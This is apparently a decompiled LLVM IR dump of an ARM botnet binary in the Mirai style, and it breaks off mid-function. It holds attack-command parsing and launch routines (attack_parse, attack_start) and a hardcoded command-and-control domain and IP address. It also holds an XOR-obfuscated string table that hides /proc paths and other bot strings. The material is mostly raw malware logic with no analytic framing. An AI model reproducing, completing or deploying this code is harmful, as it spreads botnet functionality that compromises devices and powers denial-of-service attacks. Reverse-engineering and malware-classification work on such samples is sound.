source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_2200c.21 = global i32 0
@global_var_d9a8.25 = constant i32 -382906384
@global_var_22230.30 = global i32 0
@global_var_831c.31 = constant i32 -352321547
@global_var_131f4.32 = constant i32 -382909968
@global_var_a088.38 = constant i32 -382906384
@global_var_a4c0.40 = constant i32 -382906384
@global_var_89ac.42 = constant i32 -382906384
@global_var_c1dc.44 = constant i32 -382906384
@global_var_bae4.46 = constant i32 -382906384
@global_var_b330.48 = constant i32 -382906384
@global_var_9a6c.51 = constant i32 -382906384
@global_var_93d8.53 = constant i32 -382906384
@global_var_24d4c.56 = global i32 0
@global_var_196e8.68 = constant i32 47
@global_var_24d54.70 = global i32 0
@global_var_22234.72 = global i32 0
@global_var_24d50.74 = global i32 0
@global_var_c700.75 = constant i32 -352321440
@global_var_e110.77 = constant i32 -382910352
@global_var_11190.79 = constant i32 -382910336
@global_var_d4ec.80 = constant i32 -509607932
@global_var_d834.82 = constant i32 -382910352
@global_var_220c0.84 = global i32 68424
@global_var_220b8.86 = global i32 -1
@global_var_196ec.91 = constant [22 x i8] c"indiatechsupport.club\00"
@global_var_24d5c.94 = local_unnamed_addr global i32 0
@global_var_24d5a.95 = local_unnamed_addr global i32 0
@global_var_19704.97 = constant [15 x i8] c"188.166.125.59\00"
@global_var_22238.99 = global i32 0
@global_var_19714.107 = constant i32 10
@global_var_220bc.110 = global i32 -1
@global_var_146d0.113 = constant i32 -450904024
@global_var_10b48.114 = constant i32 -382910352
@global_var_19718.117 = constant i32 16777216
@global_var_22240.119 = global i32 0
@global_var_2224c.121 = global i32 0
@global_var_22244.123 = global i32 0
@global_var_22248.125 = global i32 0
@global_var_e7c0.138 = constant i32 -509607925
@global_var_22284.140 = global i32 0
@global_var_22250.142 = global i32 0
@global_var_2227c.144 = global i32 0
@global_var_24d70.148 = global i32 0
@global_var_24d68.152 = global i32 0
@global_var_24d6c.154 = global i32 0
@global_var_22256.157 = local_unnamed_addr global i32 0
@global_var_22258.161 = local_unnamed_addr global i32 0
@global_var_2225c.162 = local_unnamed_addr global i32 0
@global_var_2225d.163 = local_unnamed_addr global i32 0
@global_var_22276.166 = local_unnamed_addr global i32 0
@global_var_19724.168 = constant i32 0
@global_var_19720.170 = constant [5 x i8] c"&;; \00"
@global_var_19728.172 = constant [5 x i8] c"5:?;\00"
@global_var_19730.174 = constant [9 x i8] c"<!: acam\00"
@global_var_1973c.176 = constant [7 x i8] c" 18:1 \00"
@global_var_19744.178 = constant [8 x i8] c"0125!8 \00"
@global_var_1974c.180 = constant [9 x i8] c"$5''#;&0\00"
@global_var_19758.182 = constant [6 x i8] c"509=:\00"
@global_var_19760.184 = constant [6 x i8] c"\22=.,\22\00"
@global_var_19768.186 = constant [8 x i8] c"'!$$;& \00"
@global_var_19770.188 = constant i32 423502179
@global_var_19780.190 = constant [6 x i8] c"efg`a\00"
@global_var_19788.192 = constant [5 x i8] c"!'1&\00"
@global_var_19790.194 = constant i32 943467547
@global_var_1979c.196 = constant i32 322070023
@global_var_22260.197 = local_unnamed_addr global i32 0
@global_var_2225e.198 = local_unnamed_addr global i32 0
@global_var_22264.199 = local_unnamed_addr global i32 0
@global_var_2226c.201 = local_unnamed_addr global i32 0
@global_var_22278.202 = local_unnamed_addr global i32 0
@global_var_e8a8.204 = constant i32 -382910352
@global_var_197a8.208 = constant [3 x i8] c"\0D\0A\00"
@global_var_197b4.210 = constant i32 2096127
@global_var_197ab.212 = constant i32 2095871
@global_var_24d78.217 = global i32 0
@global_var_220c8.220 = global i32 -555811921
@global_var_197b8.225 = constant [3 x i8] c"Qm\00"
@global_var_24d80.226 = local_unnamed_addr global i32 0
@global_var_24d84.227 = local_unnamed_addr global i32 0
@global_var_197bc.229 = constant i32 59987
@global_var_24d88.230 = local_unnamed_addr global i32 0
@global_var_24d8c.231 = local_unnamed_addr global i32 0
@global_var_19924.233 = constant i32 808465680
@global_var_24d94.234 = local_unnamed_addr global i32 0
@global_var_24d90.235 = local_unnamed_addr global i32 0
@global_var_197c0.237 = constant [7 x i8] c"'<188T\00"
@global_var_24d98.238 = local_unnamed_addr global i32 0
@global_var_24d9c.239 = local_unnamed_addr global i32 0
@global_var_197c8.241 = constant [8 x i8] c"1:5681T\00"
@global_var_24da0.242 = local_unnamed_addr global i32 0
@global_var_24da4.243 = local_unnamed_addr global i32 0
@global_var_197d0.245 = constant [8 x i8] c"'-' 19T\00"
@global_var_24da8.246 = local_unnamed_addr global i32 0
@global_var_24dac.247 = local_unnamed_addr global i32 0
@global_var_197d8.249 = constant [4 x i8] c"'<T\00"
@global_var_24db4.250 = local_unnamed_addr global i32 0
@global_var_24db0.251 = local_unnamed_addr global i32 0
@global_var_197dc.253 = constant i32 977090171
@global_var_24dbc.254 = local_unnamed_addr global i32 0
@global_var_24db8.255 = local_unnamed_addr global i32 0
@global_var_197f0.257 = constant i32 470227742
@global_var_24dc4.258 = local_unnamed_addr global i32 0
@global_var_24dc0.259 = local_unnamed_addr global i32 0
@global_var_1980c.261 = constant [10 x i8] c":7;&&17 T\00"
@global_var_24dcc.262 = local_unnamed_addr global i32 0
@global_var_24dc8.263 = local_unnamed_addr global i32 0
@global_var_19818.265 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_24dd0.266 = local_unnamed_addr global i32 0
@global_var_24dd4.267 = local_unnamed_addr global i32 0
@global_var_1982c.269 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_24ddc.270 = local_unnamed_addr global i32 0
@global_var_24dd8.271 = local_unnamed_addr global i32 0
@global_var_19844.273 = constant [8 x i8] c"{$&;7{T\00"
@global_var_24de0.274 = local_unnamed_addr global i32 0
@global_var_24de4.275 = local_unnamed_addr global i32 0
@global_var_1984c.277 = constant [6 x i8] c"{1,1T\00"
@global_var_24de8.278 = local_unnamed_addr global i32 0
@global_var_24dec.279 = local_unnamed_addr global i32 0
@global_var_19854.281 = constant [5 x i8] c"{20T\00"
@global_var_24df4.282 = local_unnamed_addr global i32 0
@global_var_24df0.283 = local_unnamed_addr global i32 0
@global_var_1985c.285 = constant [7 x i8] c"{95$'T\00"
@global_var_24df8.286 = local_unnamed_addr global i32 0
@global_var_24dfc.287 = local_unnamed_addr global i32 0
@global_var_19864.289 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_24e00.290 = local_unnamed_addr global i32 0
@global_var_24e04.291 = local_unnamed_addr global i32 0
@global_var_19874.293 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_24e60.294 = local_unnamed_addr global i32 0
@global_var_24e64.295 = local_unnamed_addr global i32 0
@global_var_19880.297 = constant [8 x i8] c"z5:=91T\00"
@global_var_24e68.298 = local_unnamed_addr global i32 0
@global_var_24e6c.299 = local_unnamed_addr global i32 0
@global_var_19888.301 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_24e08.302 = local_unnamed_addr global i32 0
@global_var_24e0c.303 = local_unnamed_addr global i32 0
@global_var_1989c.305 = constant [9 x i8] c"5''#;&0T\00"
@global_var_24e10.306 = local_unnamed_addr global i32 0
@global_var_24e14.307 = local_unnamed_addr global i32 0
@global_var_19944.309 = constant i32 557516544
@global_var_24e1c.310 = local_unnamed_addr global i32 0
@global_var_24e18.311 = local_unnamed_addr global i32 0
@global_var_198a8.313 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_24e24.314 = local_unnamed_addr global i32 0
@global_var_24e20.315 = local_unnamed_addr global i32 0
@global_var_198bc.317 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_24e2c.318 = local_unnamed_addr global i32 0
@global_var_24e28.319 = local_unnamed_addr global i32 0
@global_var_198cc.321 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_24e30.322 = local_unnamed_addr global i32 0
@global_var_24e34.323 = local_unnamed_addr global i32 0
@global_var_198dc.325 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_24e3c.326 = local_unnamed_addr global i32 0
@global_var_24e38.327 = local_unnamed_addr global i32 0
@global_var_198f0.329 = constant [9 x i8] c"$662*7!E\00"
@global_var_24e40.330 = local_unnamed_addr global i32 0
@global_var_24e44.331 = local_unnamed_addr global i32 0
@global_var_198fc.333 = constant [6 x i8] c";3=:T\00"
@global_var_24e48.334 = local_unnamed_addr global i32 0
@global_var_24e4c.335 = local_unnamed_addr global i32 0
@global_var_19904.337 = constant [7 x i8] c"1: 1&T\00"
@global_var_24e50.338 = local_unnamed_addr global i32 0
@global_var_24e54.339 = local_unnamed_addr global i32 0
@global_var_1990c.341 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_24e58.342 = local_unnamed_addr global i32 0
@global_var_24e5c.343 = local_unnamed_addr global i32 0
@global_var_22010.349 = global i32 0
@global_var_114e8.373 = constant i32 -443088884
@global_var_1197c.390 = constant i32 -456978431
@global_var_121b4.431 = constant i32 -478871519
@global_var_12c58.449 = constant i32 -478805983
@global_var_13040.459 = constant i32 -382906384
@global_var_15150.468 = constant i32 -442544040
@global_var_139d8.491 = constant i32 -369098502
@global_var_143ac.505 = constant i32 -382910288
@global_var_1455c.517 = constant i32 -2020859901
@global_var_14648.520 = constant i32 -494075872
@global_var_11354.521 = constant i32 -382910336
@global_var_251f8.524 = local_unnamed_addr global i32 0
@global_var_13470.537 = constant i32 -442543860
@global_var_118e0.546 = constant i32 -369093190
@global_var_ce7c.574 = constant [3 x i8] c"\0A\0D\00"
@global_var_15648.575 = constant i32 -382910352
@global_var_cc60.585 = constant i32 -481099767
@global_var_16a58.601 = constant i32 -382906384
@global_var_16518.629 = constant i32 -382910448
@global_var_17f08.630 = constant i32 -382909968
@global_var_18644.692 = constant i32 -481296376
@global_var_1873c.693 = constant i32 -481296376
@global_var_187c0.694 = constant i32 -369098732
@global_var_22210.11 = external global i8*
@global_var_2222c.28 = external global i8*
@global_var_2222d.36 = global i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_220c4.88 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_24d58.93 = global i16* null
@global_var_2223c.111 = external global i8*
@global_var_22280.146 = global i16* null
@global_var_22254.156 = external global i8*
@global_var_22268.159 = global i16 0
@global_var_22274.160 = local_unnamed_addr global i8 0
@global_var_2226a.164 = local_unnamed_addr global i16 0
@global_var_22275.165 = local_unnamed_addr global i8 0
@global_var_22068.345 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_22210.11 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_22210.11 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_22210.11, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_2200c.21, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_2200c.21 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2200c.21, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_d9a8.25 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 104152, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_start(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_822c = load i32, i32* @r4, align 4
  store i32 %v3_822c, i32* %stack_var_-32, align 4
  %v6_822c = load i32, i32* @r5, align 4
  %v9_822c = load i32, i32* @r6, align 4
  %v12_822c = load i32, i32* @r7, align 4
  %v0_8230 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8230, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @sl, align 4
  %v4_8240 = sext i8 %arg5 to i32
  store i32 %v4_8240, i32* @r8, align 4
  %v0_8244 = call i32 @__libc_fork()
  %v7_8248 = icmp eq i32 %v0_8244, -1
  %. = zext i1 %v7_8248 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_8244, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %entry
  br label %dec_label_pc_8268

bb24:                                             ; preds = %entry
  store i32 %., i32* @r5, align 4
  %v2_8260 = icmp eq i1 %v7_8248, false
  br i1 %v2_8260, label %dec_label_pc_8270, label %dec_label_pc_8268

dec_label_pc_8268:                                ; preds = %.thread2, %bb24
  %v2_8268 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8268, i32* @r4, align 4
  store i32 %v6_822c, i32* @r5, align 4
  store i32 %v9_822c, i32* @r6, align 4
  store i32 %v12_822c, i32* @r7, align 4
  ret i32 %v0_8244

dec_label_pc_8270:                                ; preds = %bb24
  %v0_8270 = call i32 @__libc_fork()
  %v7_8274 = icmp eq i32 %v0_8270, -1
  store i32 %v0_8270, i32* @r4, align 4
  br i1 %v7_8274, label %dec_label_pc_82a4, label %dec_label_pc_8280

dec_label_pc_8280:                                ; preds = %dec_label_pc_8270
  %v2_8280 = icmp eq i32 %v0_8270, 0
  br i1 %v2_8280, label %dec_label_pc_8288, label %dec_label_pc_82ac

dec_label_pc_8288:                                ; preds = %dec_label_pc_8280
  %v0_8288 = load i32, i32* @r6, align 4
  %v1_828c = call i32 @sleep(i32 %v0_8288)
  store i32 %v1_828c, i32* @r0, align 4
  %v0_8290 = call i32 @getppid()
  %v2_8298 = call i32 @kill(i32 %v0_8290, i32 9)
  %v0_829c = load i32, i32* @r4, align 4
  %v1_82a0 = call i32 @__GI_exit(i32 %v0_829c)
  br label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8270, %dec_label_pc_8288
  %v0_82a4 = load i32, i32* @r5, align 4
  %v1_82a8 = call i32 @__GI_exit(i32 %v0_82a4)
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8280, %dec_label_pc_82a4
  store i32 ptrtoint (i8** @global_var_2222c.28 to i32), i32* %r3.global-to-local, align 4
  %v2_82b0 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_82b0 = zext i8 %v2_82b0 to i32
  %v2_82b4 = icmp eq i8 %v2_82b0, 0
  br i1 %v2_82b4, label %dec_label_pc_82f8, label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %dec_label_pc_82ac
  store i32 ptrtoint (i32* @global_var_22230.30 to i32), i32* %r3.global-to-local, align 4
  %v2_82c0 = load i32, i32* @global_var_22230.30, align 4
  %v1_82c4 = inttoptr i32 %v2_82c0 to i32*
  %v2_82c4 = load i32, i32* %v1_82c4, align 4
  store i32 %v2_82c4, i32* @ip, align 4
  %v1_82c8 = add i32 %v2_82c4, 4
  %v2_82c8 = inttoptr i32 %v1_82c8 to i8*
  %v3_82c8 = load i8, i8* %v2_82c8, align 1
  %v4_82c8 = zext i8 %v3_82c8 to i32
  store i32 %v4_82c8, i32* %r3.global-to-local, align 4
  %v1_82cc = load i32, i32* @r7, align 4
  %v9_82cc = icmp eq i32 %v4_82c8, %v1_82cc
  br i1 %v9_82cc, label %dec_label_pc_8300, label %dec_label_pc_82ec.preheader

dec_label_pc_82ec.preheader:                      ; preds = %dec_label_pc_82bc
  %v1_82d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ec

dec_label_pc_82dc:                                ; preds = %dec_label_pc_82ec
  %v4_82dc = mul i32 %v1_82ec, 4
  %v5_82dc = add i32 %v4_82dc, %v2_82c0
  %v6_82dc = inttoptr i32 %v5_82dc to i32*
  %v7_82dc = load i32, i32* %v6_82dc, align 4
  store i32 %v7_82dc, i32* @ip, align 4
  %v1_82e0 = add i32 %v7_82dc, 4
  %v2_82e0 = inttoptr i32 %v1_82e0 to i8*
  %v3_82e0 = load i8, i8* %v2_82e0, align 1
  %v4_82e0 = zext i8 %v3_82e0 to i32
  store i32 %v4_82e0, i32* %r3.global-to-local, align 4
  %v9_82e4 = icmp eq i32 %v4_82e0, %v1_82cc
  br i1 %v9_82e4, label %dec_label_pc_8300, label %dec_label_pc_82ec

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82ec.preheader, %dec_label_pc_82dc
  %v0_82ec = phi i32 [ %v1_82d0, %dec_label_pc_82ec.preheader ], [ %v1_82ec, %dec_label_pc_82dc ]
  %v1_82ec = add i32 %v0_82ec, 1
  %v9_82f0 = icmp eq i32 %v1_82ec, %v3_82b0
  br i1 %v9_82f0, label %dec_label_pc_82f8, label %dec_label_pc_82dc

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec, %dec_label_pc_82ac, %dec_label_pc_8300
  %v1_82fc = call i32 @__GI_exit(i32 0)
  %v0_8310.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_82dc, %dec_label_pc_82bc, %dec_label_pc_82f8
  %v0_8310 = phi i32 [ %v2_82c4, %dec_label_pc_82bc ], [ %v0_8310.pre, %dec_label_pc_82f8 ], [ %v7_82dc, %dec_label_pc_82dc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_8310 = inttoptr i32 %v0_8310 to i32*
  %v2_8310 = load i32, i32* %v1_8310, align 4
  store i32 %v2_8310, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_8310)
  br label %dec_label_pc_82f8

; uselistorder directives
  uselistorder i32 %v1_82ec, { 2, 0, 1 }
  uselistorder i32 %v0_8270, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_8248, { 1, 0 }
  uselistorder i32 %v0_8244, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_8300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ec, { 1, 0 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_82a4, { 1, 0 }
  uselistorder label %dec_label_pc_8268, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8328 = load i32, i32* @r5, align 4
  %v9_8328 = load i32, i32* @r6, align 4
  %v12_8328 = load i32, i32* @r7, align 4
  %v18_8328 = load i32, i32* @sb, align 4
  %v21_8328 = load i32, i32* @sl, align 4
  %v24_8328 = load i32, i32* @fp, align 4
  %v2_832c = icmp ugt i32 %arg2, 2
  %v7_832c = icmp eq i32 %arg2, 3
  store i1 %v7_832c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8338, i32* @r5, align 4
  %v2_833c = xor i1 %v7_832c, true
  %v3_833c = and i1 %v2_832c, %v2_833c
  br i1 %v3_833c, label %dec_label_pc_834c, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_838c, %.dec_label_pc_8340_crit_edge, %dec_label_pc_8380, %dec_label_pc_8370, %dec_label_pc_834c, %entry, %dec_label_pc_8538
  %v1_8348 = phi i32 [ %v1_8348.pre, %.dec_label_pc_8340_crit_edge ], [ %v1_8350, %dec_label_pc_838c ], [ %v1_8350, %dec_label_pc_8380 ], [ %v1_8350, %dec_label_pc_8370 ], [ %v1_8350, %dec_label_pc_834c ], [ %v0_8338, %entry ], [ %v0_853c, %dec_label_pc_8538 ]
  store i32 %v6_8328, i32* @r5, align 4
  store i32 %v9_8328, i32* @r6, align 4
  store i32 %v12_8328, i32* @r7, align 4
  store i32 %v18_8328, i32* @sb, align 4
  store i32 %v21_8328, i32* @sl, align 4
  store i32 %v24_8328, i32* @fp, align 4
  ret i32 %v1_8348

dec_label_pc_834c:                                ; preds = %entry
  %v1_834c = inttoptr i32 %v0_8338 to i32*
  %v2_834c = load i32, i32* %v1_834c, align 4
  store i32 %v2_834c, i32* %r1.global-to-local, align 4
  %v1_8350 = and i32 %v2_834c, 16711680
  store i32 %v1_8350, i32* %r0.global-to-local, align 4
  %v3_8354 = udiv i32 %v2_834c, 16777216
  %v4_8358 = udiv i32 %v1_8350, 256
  %v5_8358 = or i32 %v4_8358, %v3_8354
  %v1_835c = and i32 %v2_834c, 65280
  store i32 %v1_835c, i32* %r2.global-to-local, align 4
  %v4_8360 = mul nuw nsw i32 %v1_835c, 256
  %v5_8360 = or i32 %v5_8358, %v4_8360
  store i32 %v5_8360, i32* %r3.global-to-local, align 4
  %v7_8364 = icmp eq i32 %arg2, 4
  store i1 %v7_8364, i1* %cpsr_z.global-to-local, align 1
  %v5_8368 = call i32 @llvm.bswap.i32(i32 %v2_834c)
  store i32 %v5_8368, i32* @fp, align 4
  br i1 %v7_8364, label %dec_label_pc_8340, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_834c
  %v1_8370 = add i32 %v0_8338, 4
  %v2_8370 = inttoptr i32 %v1_8370 to i8*
  %v3_8370 = load i8, i8* %v2_8370, align 1
  %v4_8370 = zext i8 %v3_8370 to i32
  store i32 %v4_8370, i32* %r2.global-to-local, align 4
  %v7_8374 = icmp eq i32 %arg2, 5
  store i1 %v7_8374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8374, label %dec_label_pc_8340, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8370
  %v1_8380 = add i32 %v0_8338, 5
  %v2_8380 = inttoptr i32 %v1_8380 to i8*
  %v3_8380 = load i8, i8* %v2_8380, align 1
  %v4_8380 = zext i8 %v3_8380 to i32
  store i32 %v4_8380, i32* @sb, align 4
  %v2_8384 = icmp eq i8 %v3_8380, 0
  store i1 %v2_8384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8384, label %dec_label_pc_8340, label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_8380
  %v2_8390 = mul nuw nsw i32 %v4_8380, 5
  store i32 %v2_8390, i32* @r7, align 4
  %v1_8394 = add i32 %arg2, -6
  store i32 %v1_8394, i32* %r3.global-to-local, align 4
  %v3_8398 = icmp ult i32 %v1_8394, %v2_8390
  %v9_8398 = icmp eq i32 %v1_8394, %v2_8390
  store i1 %v9_8398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8398, label %dec_label_pc_8340, label %dec_label_pc_83a0

dec_label_pc_83a0:                                ; preds = %dec_label_pc_838c
  store i32 %v4_8380, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8394, i32* @r6, align 4
  %v2_83ac = call i32 @calloc(i32 %v4_8380, i32 24)
  store i32 %v2_83ac, i32* %ip.global-to-local, align 4
  %v0_83b8 = load i32, i32* @r7, align 4
  %v1_83b8 = load i32, i32* @r4, align 4
  %v2_83b8 = sub i32 %v1_83b8, %v0_83b8
  store i32 %v2_83b8, i32* @r7, align 4
  %v0_83bc = load i32, i32* @r5, align 4
